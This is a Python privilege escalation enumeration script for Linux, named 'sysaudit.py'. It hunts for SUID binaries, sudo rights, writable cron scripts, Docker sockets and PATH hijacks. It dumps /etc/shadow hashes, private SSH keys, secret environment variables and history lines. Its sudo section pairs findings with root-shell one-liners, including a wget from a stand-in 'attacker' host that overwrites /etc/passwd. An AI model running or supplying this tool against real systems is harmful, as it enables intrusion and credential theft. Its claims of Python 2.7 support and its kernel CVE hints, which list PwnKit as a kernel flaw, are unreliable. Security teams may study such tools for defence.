#!/usr/bin/env python3
"""
sysaudit.py — Linux privilege escalation checker
=================================================
Pure stdlib. No pip install. Works on Python 2.7+ and Python 3.

Usage:
    python3 sysaudit.py
    python3 sysaudit.py --out report.txt     # also save to file
    python3 sysaudit.py --fast               # skip slow checks (find / etc.)
    python3 sysaudit.py --section suid       # run one section only

Sections:
    system      OS / kernel / arch info
    users       Users, groups, sudoers, logged-in sessions
    suid        SUID / SGID binaries (GTFOBins hits highlighted)
    caps        File capabilities (cap_setuid etc.)
    sudo        sudo -l analysis + known bypass techniques
    cron        Cron jobs — writable scripts, world-writable dirs
    services    Running services, listening ports
    files       World-writable dirs/files, interesting file search
    env         Environment variables, PATH hijack candidates
    docker      Docker / LXC / namespace escape indicators
    net         Network interfaces, routes, hosts, iptables
    passwd      /etc/passwd and /etc/shadow readable?
    ssh         SSH keys, known_hosts, authorized_keys
    history     Shell history files
"""

import os, sys, re, stat, pwd, grp, subprocess, platform, time, argparse
from pathlib import Path

PY3 = sys.version_info[0] >= 3

# ── Colours ────────────────────────────────────────────────────────────────────
USE_COLOR = sys.stdout.isatty()
def _c(code): return code if USE_COLOR else ""
R  = _c("\033[31m"); G  = _c("\033[32m"); Y  = _c("\033[33m")
C  = _c("\033[36m"); B  = _c("\033[1m");  M  = _c("\033[35m"); X  = _c("\033[0m")

OUTPUT_LINES = []

def _print(msg="", colour=""):
    line = f"{colour}{msg}{X}" if colour else msg
    print(line, flush=True)
    OUTPUT_LINES.append(re.sub(r'\033\[[0-9;]*m', '', line))  # strip colours for file

def banner(title):
    bar = "═" * 60
    _print(f"\n{B}{C}{bar}{X}")
    _print(f"{B}{C}  {title}{X}")
    _print(f"{B}{C}{bar}{X}")

def hit(msg):   _print(f"  {R}[!]{X} {msg}", R)
def warn(msg):  _print(f"  {Y}[*]{X} {msg}", Y)
def good(msg):  _print(f"  {G}[+]{X} {msg}", G)
def info(msg):  _print(f"  {C}[-]{X} {msg}")
def sub(msg):   _print(f"      {msg}")

def run(cmd, shell=True, timeout=15):
    try:
        r = subprocess.run(cmd, shell=shell, capture_output=True, text=True, timeout=timeout)
        return (r.stdout + r.stderr).strip()
    except Exception:
        return ""

def file_read(path):
    try:
        return Path(path).read_text(errors="replace")
    except Exception:
        return None

def exists(path):
    return os.path.exists(path)


# ══════════════════════════════════════════════════════════════════════════════
#  GTFOBINS reference (SUID / sudo)
# ══════════════════════════════════════════════════════════════════════════════

GTFO = {
    "nmap","vim","vi","nano","less","more","man","awk","find","python","python2","python3",
    "perl","ruby","lua","php","bash","sh","zsh","dash","ksh","tcsh","csh","fish",
    "tar","zip","unzip","gzip","gunzip","bzip2","7z","curl","wget","ftp","tftp",
    "socat","nc","netcat","ncat","telnet","ssh","scp","rsync","git","svn",
    "gcc","cc","make","tee","cp","mv","dd","cat","head","tail","cut","sort",
    "xargs","env","nice","timeout","strace","ltrace","gdb","stdbuf","watch",
    "screen","tmux","pico","joe","emacs","ed","ex","xxd","od","strings",
    "base32","base64","openssl","mysql","sqlite3","psql","node","nodejs","ruby",
    "irb","jjs","rlwrap","awk","gawk","mawk","nawk","column","tclsh","expect",
    "cobc","busybox","ash","docker","lxc","runc","kubectl","helm","ansible",
    "rpm","apt","apt-get","yum","dnf","pip","pip3","gem","cpan","cargo",
    "chmod","chown","chgrp","install","ln","mount","umount","systemctl",
    "journalctl","dmesg","ip","ifconfig","iptables","nft","tcpdump","capsh",
    "nsenter","unshare","chroot","su","sudo","pkexec","newgrp","sg",
}


# ══════════════════════════════════════════════════════════════════════════════
#  SECTIONS
# ══════════════════════════════════════════════════════════════════════════════

def section_system():
    banner("SYSTEM INFO")
    info(f"Hostname   : {platform.node()}")
    info(f"OS         : {platform.platform()}")
    info(f"Kernel     : {platform.release()}")
    info(f"Arch       : {platform.machine()}")
    info(f"Python     : {sys.version.split()[0]}")
    info(f"User       : {run('id')}")
    info(f"Shell      : {os.environ.get('SHELL','?')}")
    info(f"Uptime     : {run('uptime -p 2>/dev/null || uptime')}")

    # Kernel CVE hints
    kernel = platform.release()
    m = re.match(r"(\d+)\.(\d+)", kernel)
    if m:
        major, minor = int(m.group(1)), int(m.group(2))
        notable = {
            (4,4):  "CVE-2016-5195 (DirtyCow)",
            (4,8):  "CVE-2016-5195 (DirtyCow)",
            (3,13): "CVE-2014-4699 / CVE-2014-4014",
            (5,8):  "CVE-2021-4034 (PwnKit) possible",
        }
        for (ma, mi), cve in notable.items():
            if major == ma and minor <= mi:
                hit(f"Kernel {kernel} — check: {cve}")


def section_users():
    banner("USERS & GROUPS")
    info(f"Current user : {run('whoami')}")
    info(f"ID           : {run('id')}")
    groups = run("groups")
    info(f"Groups       : {groups}")

    interesting_groups = {"docker","lxd","lxc","disk","adm","shadow","sudo","wheel","staff","video","input","kvm","libvirt"}
    for g in interesting_groups:
        if re.search(r'\b' + g + r'\b', groups):
            hit(f"Member of '{g}' group — privesc vector possible")

    _print()
    info("Users with login shell:")
    for line in (file_read("/etc/passwd") or "").splitlines():
        parts = line.split(":")
        if len(parts) >= 7 and parts[6] not in ("/usr/sbin/nologin","/bin/false","/sbin/nologin",""):
            uid = int(parts[2]) if parts[2].isdigit() else -1
            if uid == 0 or uid >= 1000:
                marker = f"{R}(root){X}" if uid == 0 else ""
                sub(f"{parts[0]} (uid={parts[2]}) {marker}")

    _print()
    info("Recent logins:")
    _print(f"  {run('last -n 10 2>/dev/null | head -12')}")

    # sudo rights summary
    sudoers = file_read("/etc/sudoers")
    if sudoers:
        good("/etc/sudoers is READABLE")
        for line in sudoers.splitlines():
            line = line.strip()
            if line and not line.startswith("#"):
                sub(line)
    else:
        info("/etc/sudoers not readable (normal)")


def section_suid():
    banner("SUID / SGID BINARIES")
    warn("Searching — may take a moment …")
    out = run("find / -perm /6000 -type f 2>/dev/null", timeout=60)
    if not out:
        info("No SUID/SGID binaries found (or permission denied everywhere)")
        return
    hits = []
    others = []
    for path in sorted(set(out.splitlines())):
        name = os.path.basename(path)
        if name in GTFO:
            hits.append(path)
        else:
            others.append(path)
    if hits:
        hit(f"{len(hits)} SUID/SGID binaries with GTFOBins entries:")
        for p in hits:
            _print(f"  {R}  ★ {p}{X}")
    if others:
        info(f"{len(others)} other SUID/SGID binaries:")
        for p in others:
            sub(p)


def section_caps():
    banner("FILE CAPABILITIES")
    out = run("getcap -r / 2>/dev/null", timeout=45)
    if not out:
        info("No capabilities found (getcap not available or none set)")
        return
    dangerous = {"cap_setuid","cap_setgid","cap_dac_override","cap_dac_read_search","cap_sys_admin","cap_net_raw","cap_sys_ptrace"}
    for line in out.splitlines():
        lower = line.lower()
        if any(d in lower for d in dangerous):
            hit(line)
        else:
            info(line)


def section_sudo():
    banner("SUDO ANALYSIS")
    out = run("sudo -l 2>/dev/null")
    if not out:
        info("sudo -l returned nothing (no sudo rights or requires password)")
        return
    _print(f"  {out}")
    _print()

    # Pattern matching
    patterns = {
        r'\(ALL.*\)\s*NOPASSWD:\s*ALL':   "ALL commands as root with no password — trivial root",
        r'NOPASSWD.*\bfind\b':            "find NOPASSWD — find -exec /bin/sh ; or find -exec python",
        r'NOPASSWD.*\bvim?\b':            "vim NOPASSWD — :!/bin/bash",
        r'NOPASSWD.*\bnano\b':            "nano NOPASSWD — Ctrl-R Ctrl-X exec",
        r'NOPASSWD.*\bless\b':            "less NOPASSWD — !bash",
        r'NOPASSWD.*\bmore\b':            "more NOPASSWD — !bash",
        r'NOPASSWD.*\bawk\b':             "awk NOPASSWD — awk 'BEGIN{system(\"/bin/bash\")}'",
        r'NOPASSWD.*\bperl\b':            "perl NOPASSWD — perl -e 'exec \"/bin/bash\"'",
        r'NOPASSWD.*\bpython':            "python NOPASSWD — python -c 'import os;os.system(\"/bin/bash\")'",
        r'NOPASSWD.*\bruby\b':            "ruby NOPASSWD — ruby -e 'exec \"/bin/bash\"'",
        r'NOPASSWD.*\bnmap\b':            "nmap NOPASSWD — nmap --interactive (older) or script",
        r'NOPASSWD.*\btee\b':             "tee NOPASSWD — write to /etc/passwd or /etc/cron.d",
        r'NOPASSWD.*\bcp\b':              "cp NOPASSWD — overwrite /etc/passwd or sudoers",
        r'NOPASSWD.*\bchmod\b':           "chmod NOPASSWD — chmod u+s /bin/bash",
        r'NOPASSWD.*\btar\b':             "tar NOPASSWD — tar -cf /dev/null /dev/null --checkpoint-action=exec=/bin/bash",
        r'NOPASSWD.*\bcurl\b':            "curl NOPASSWD — curl file:///etc/shadow",
        r'NOPASSWD.*\bwget\b':            "wget NOPASSWD — wget -O /etc/passwd http://attacker/passwd",
        r'NOPASSWD.*\bdocker\b':          "docker NOPASSWD — docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
        r'NOPASSWD.*\benv\b':             "env NOPASSWD — env /bin/bash",
        r'NOPASSWD.*\bstrace\b':          "strace NOPASSWD — strace -e execve /bin/bash",
        r'env_keep.*LD_PRELOAD':          "LD_PRELOAD kept — compile shared lib calling setuid(0)+system('/bin/bash')",
        r'env_keep.*PYTHONPATH':          "PYTHONPATH kept — drop malicious module in path",
    }
    for pattern, advice in patterns.items():
        if re.search(pattern, out, re.IGNORECASE):
            hit(advice)


def section_cron():
    banner("CRON JOBS")
    cron_paths = [
        "/etc/crontab",
        "/etc/cron.d",
        "/etc/cron.hourly",
        "/etc/cron.daily",
        "/etc/cron.weekly",
        "/etc/cron.monthly",
        "/var/spool/cron/crontabs",
        "/var/spool/cron",
    ]
    found_any = False
    for cp in cron_paths:
        p = Path(cp)
        if not p.exists():
            continue
        if p.is_file():
            content = file_read(cp)
            if content:
                found_any = True
                info(f"{cp}:")
                for line in content.splitlines():
                    line = line.strip()
                    if line and not line.startswith("#"):
                        sub(line)
                        # Check if script in cron job is writable
                        m = re.search(r'(/[^\s;|&]+\.(sh|py|pl|rb|php))', line)
                        if m:
                            script = m.group(1)
                            if exists(script) and os.access(script, os.W_OK):
                                hit(f"Writable cron script: {script}")
                            elif not exists(script):
                                hit(f"Missing cron script (path hijack): {script}")
        elif p.is_dir():
            for f in p.iterdir():
                content = file_read(str(f))
                if content:
                    found_any = True
                    info(f"{f}:")
                    for line in content.splitlines():
                        line = line.strip()
                        if line and not line.startswith("#"):
                            sub(line)
                            m = re.search(r'(/[^\s;|&]+\.(sh|py|pl|rb|php))', line)
                            if m:
                                script = m.group(1)
                                if exists(script) and os.access(script, os.W_OK):
                                    hit(f"Writable cron script: {script}")
                                elif not exists(script):
                                    hit(f"Missing cron script (path hijack): {script}")
    if not found_any:
        info("No readable cron jobs found")

    # pspy-style: check /proc for recently spawned processes owned by root
    info("Checking /proc for root processes (snapshot):")
    root_procs = []
    try:
        for pid in os.listdir("/proc"):
            if not pid.isdigit():
                continue
            try:
                st = os.stat(f"/proc/{pid}")
                if st.st_uid == 0:
                    cmdline = Path(f"/proc/{pid}/cmdline").read_bytes().replace(b'\x00', b' ').decode(errors='replace').strip()
                    if cmdline:
                        root_procs.append(cmdline)
            except Exception:
                pass
    except Exception:
        pass
    for p in root_procs[:30]:
        sub(p)


def section_services():
    banner("SERVICES & LISTENING PORTS")
    info("Listening ports:")
    out = run("ss -tlnpu 2>/dev/null || netstat -tlnpu 2>/dev/null")
    _print(f"  {out}")
    _print()
    info("Running services:")
    svc = run("systemctl list-units --type=service --state=running 2>/dev/null | head -40")
    if svc:
        _print(f"  {svc}")
    else:
        _print(f"  {run('service --status-all 2>/dev/null | grep + | head -30')}")


def section_files():
    banner("INTERESTING FILES")

    info("World-writable directories (excl. /proc /sys /dev):")
    out = run("find / -maxdepth 5 -type d -perm -0002 ! -path '/proc/*' ! -path '/sys/*' ! -path '/dev/*' 2>/dev/null", timeout=30)
    for line in (out or "").splitlines()[:40]:
        warn(line)

    _print()
    info("World-writable files NOT in sticky dirs (excl. /proc /sys /dev /tmp /run):")
    out = run(
        "find / -maxdepth 8 -type f -perm -0002 ! -path '/proc/*' ! -path '/sys/*' "
        "! -path '/dev/*' ! -path '/tmp/*' ! -path '/run/*' 2>/dev/null",
        timeout=45,
    )
    for line in (out or "").splitlines()[:40]:
        hit(line)

    _print()
    info("Files with passwords / keys in names:")
    out = run(
        "find / -maxdepth 10 -type f \\( -name '*pass*' -o -name '*secret*' -o -name '*.key' "
        "-o -name '*.pem' -o -name '*.pfx' -o -name '*.p12' -o -name 'id_rsa' "
        "-o -name 'id_ed25519' -o -name '*.ovpn' \\) 2>/dev/null",
        timeout=45,
    )
    for line in (out or "").splitlines()[:60]:
        hit(line)

    _print()
    info("Readable /etc/shadow?")
    shadow = file_read("/etc/shadow")
    if shadow:
        hit("/etc/shadow is READABLE:")
        for line in shadow.splitlines()[:10]:
            if ":" in line and not line.startswith("#"):
                parts = line.split(":")
                if parts[1] not in ("*", "!", "!!"):
                    hit(f"  Hashed password: {line}")


def section_env():
    banner("ENVIRONMENT & PATH")
    env = dict(os.environ)
    for k, v in sorted(env.items()):
        if any(x in k.upper() for x in ("PASS","TOKEN","SECRET","KEY","API","AWS","AZURE","GCP","AUTH","CRED")):
            hit(f"{k}={v}")
        else:
            info(f"{k}={v}")

    _print()
    info("PATH analysis:")
    path_dirs = env.get("PATH", "").split(":")
    for d in path_dirs:
        if not d:
            hit("Empty entry in PATH — current directory injection possible")
            continue
        sub(d)
        if os.access(d, os.W_OK):
            hit(f"Writable PATH dir: {d} — PATH hijack possible")
        if not exists(d):
            hit(f"Missing PATH dir: {d} — PATH hijack if dir created")


def section_docker():
    banner("CONTAINER / VIRTUALISATION")

    # Am I in a container?
    if exists("/.dockerenv"):
        hit("/.dockerenv found — running inside Docker")
    if exists("/run/.containerenv"):
        hit("/run/.containerenv found — running inside Podman/container")
    cgroup = file_read("/proc/1/cgroup") or ""
    if "docker" in cgroup or "lxc" in cgroup or "kubepods" in cgroup:
        hit(f"/proc/1/cgroup indicates container: {cgroup[:200]}")

    # Docker socket accessible?
    for sock in ("/var/run/docker.sock", "/run/docker.sock"):
        if exists(sock) and os.access(sock, os.R_OK):
            hit(f"Docker socket readable: {sock}  →  docker run -v /:/mnt alpine chroot /mnt sh")

    # Namespace escapes
    info(f"Namespaces: {run('ls -la /proc/1/ns 2>/dev/null')}")
    if run("which nsenter 2>/dev/null"):
        warn("nsenter available — potential namespace escape if PID 1 is host")

    # LXD / LXC group already checked in users section
    info(f"Virtualisation: {run('systemd-detect-virt 2>/dev/null || hostnamectl 2>/dev/null | grep Virtualization')}")


def section_net():
    banner("NETWORK")
    info("Interfaces:")
    _print(f"  {run('ip addr 2>/dev/null || ifconfig -a 2>/dev/null')}")
    _print()
    info("Routes:")
    _print(f"  {run('ip route 2>/dev/null || route -n 2>/dev/null')}")
    _print()
    info("ARP cache:")
    _print(f"  {run('arp -n 2>/dev/null || ip neigh 2>/dev/null')}")
    _print()
    info("/etc/hosts:")
    _print(f"  {file_read('/etc/hosts') or '(unreadable)'}")
    _print()
    info("iptables rules:")
    out = run("iptables -L -n 2>/dev/null")
    if out:
        _print(f"  {out[:1000]}")
    else:
        info("(iptables not readable or empty)")


def section_passwd():
    banner("/etc/passwd + /etc/shadow")
    passwd = file_read("/etc/passwd")
    if passwd:
        good("/etc/passwd readable")
        for line in passwd.splitlines():
            if ":" not in line:
                continue
            parts = line.split(":")
            uid = int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else -1
            if uid == 0:
                hit(f"UID 0 user: {line}")
            if len(parts) > 1 and parts[1] not in ("x", "*", "!"):
                hit(f"Password hash directly in /etc/passwd: {line}")
    else:
        info("/etc/passwd not readable (unusual)")

    shadow = file_read("/etc/shadow")
    if shadow:
        hit("/etc/shadow is READABLE — extract hashes:")
        for line in shadow.splitlines()[:20]:
            if ":" in line:
                parts = line.split(":")
                if parts[1] not in ("*", "!", "!!", ""):
                    hit(f"  {line}")
    else:
        info("/etc/shadow not readable (normal)")


def section_ssh():
    banner("SSH KEYS & CONFIG")
    search_roots = [Path.home(), Path("/root"), Path("/home")]
    found = []
    for root in search_roots:
        if not root.exists():
            continue
        for key_name in ("id_rsa","id_ed25519","id_ecdsa","id_dsa","authorized_keys","known_hosts"):
            for path in root.rglob(key_name):
                found.append(path)

    for p in found:
        readable = os.access(str(p), os.R_OK)
        marker = G + "(readable)" + X if readable else R + "(not readable)" + X
        _print(f"  {p}  {marker}")
        if readable and "authorized_keys" not in str(p) and "known_hosts" not in str(p):
            hit(f"Private key readable: {p}")
            content = file_read(str(p))
            if content and "PRIVATE KEY" in content:
                sub(content[:200])


def section_history():
    banner("SHELL HISTORY")
    history_files = [
        "~/.bash_history", "~/.zsh_history", "~/.sh_history",
        "~/.history", "~/.python_history", "~/.mysql_history",
        "~/.psql_history", "~/.local/share/fish/fish_history",
        "/root/.bash_history",
    ]
    sensitive = re.compile(
        r'(pass(word)?|token|secret|api.?key|auth|curl.+-u|wget.+--password|'
        r'mysql.+-p|sshpass|AWS_|AZURE_|base64)', re.IGNORECASE
    )
    for hf in history_files:
        path = os.path.expanduser(hf)
        if not exists(path):
            continue
        content = file_read(path)
        if not content:
            continue
        info(f"{path} ({len(content.splitlines())} lines):")
        for line in content.splitlines():
            if sensitive.search(line):
                hit(f"  {line.strip()}")
            else:
                sub(line.strip()[:120])


# ══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════════════════

ALL_SECTIONS = {
    "system":   section_system,
    "users":    section_users,
    "suid":     section_suid,
    "caps":     section_caps,
    "sudo":     section_sudo,
    "cron":     section_cron,
    "services": section_services,
    "files":    section_files,
    "env":      section_env,
    "docker":   section_docker,
    "net":      section_net,
    "passwd":   section_passwd,
    "ssh":      section_ssh,
    "history":  section_history,
}

def main():
    parser = argparse.ArgumentParser(description="Linux privilege escalation checker")
    parser.add_argument("--out",     help="Save output to file")
    parser.add_argument("--fast",    action="store_true", help="Skip slow filesystem searches")
    parser.add_argument("--section", choices=list(ALL_SECTIONS.keys()), help="Run one section only")
    args = parser.parse_args()

    if args.fast:
        # Patch slow functions with stubs
        for name in ("suid","files"):
            ALL_SECTIONS[name] = lambda n=name: (banner(n.upper()), warn("Skipped (--fast mode)"))

    start = time.time()
    _print(f"\n{B}{'='*60}{X}")
    _print(f"{B}  sysaudit.py — Linux Privesc Checker{X}")
    _print(f"{B}  {time.strftime('%Y-%m-%d %H:%M:%S')}  |  {platform.node()}{X}")
    _print(f"{B}{'='*60}{X}")

    if args.section:
        ALL_SECTIONS[args.section]()
    else:
        for fn in ALL_SECTIONS.values():
            try:
                fn()
            except Exception as e:
                warn(f"Section error: {e}")

    elapsed = time.time() - start
    _print(f"\n{B}Done in {elapsed:.1f}s{X}\n")

    if args.out:
        try:
            Path(args.out).write_text("\n".join(OUTPUT_LINES))
            _print(f"{G}[+] Report saved to {args.out}{X}")
        except Exception as e:
            _print(f"{R}[!] Could not write {args.out}: {e}{X}")


if __name__ == "__main__":
    main()
